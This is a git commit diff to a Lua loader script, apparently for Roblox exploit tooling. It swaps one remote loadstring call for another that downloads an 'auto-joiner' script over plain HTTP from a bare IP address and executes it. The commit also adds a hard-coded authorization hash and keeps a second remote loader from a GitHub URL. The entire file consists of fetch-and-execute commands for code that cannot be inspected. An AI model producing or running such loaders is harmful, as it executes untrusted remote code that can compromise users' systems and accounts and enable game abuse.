b5b2b9d09019311c2dd252b3812078977f8656fb
NoLag-id <sfpher6@gmail.com>
2025-08-30 20:26:27 +0800

    Update LoaderV1.lua

--- LoaderV1.lua
+++ LoaderV1.lua
@@ -1,2 +1,3 @@
-loadstring(game:HttpGet("https://pastefy.app/YTqgONaY/raw"))()
+AUTHORIZATION_KEY="$2b$10$LQUMBuPMEGa6CjyC2MgreumBE35ZOt02c75n9hfT6Kgb/9CpcSYa.";
+loadstring(game:HttpGet("http://5.129.217.87:3910/cdn/auto-joiner.luau"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/azbalalaff/loading-screen/refs/heads/main/loader.lua"))()
